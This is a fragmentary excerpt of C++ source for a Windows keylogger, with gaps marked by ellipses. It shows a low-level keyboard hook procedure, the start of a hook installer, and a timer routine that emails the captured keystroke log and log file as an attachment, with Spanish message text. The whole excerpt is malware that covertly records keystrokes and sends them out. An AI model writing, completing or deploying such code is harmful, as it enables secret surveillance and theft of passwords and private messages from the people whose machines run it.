...
void TimerSendMail()
{
    ...
    if(last_file.empty())
    {
       Helper::WriteAppLog("File creation was NOT. keylog '" + keylog + "'");
       return;
    }

    int x = Mail::SendMail("Log [" + last_file + "]",
                           "Hi ;)\nEl archivo ha sido agregado a este correo\n" + keylog, IO::GetOurPath(true) + last_file);
    if(x!=7)
        Helper::WriteAppLog("Mail NoEnviado!!! ErrorCode: " + Helper::ToString(x));
    else
        keylog = "";
}
    ...
    LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
    {
        ...
        else if(wparam==WM_KEYUP || wparam == WM_SYSKEYUP)
        {
            ...
            if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT || key == VK_RSHIFT
                || key == VK_LSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_RMENU
    ...
    bool InstallHook()
    {
        Helper::WriteAppLog("HookStarted...TimerStart");
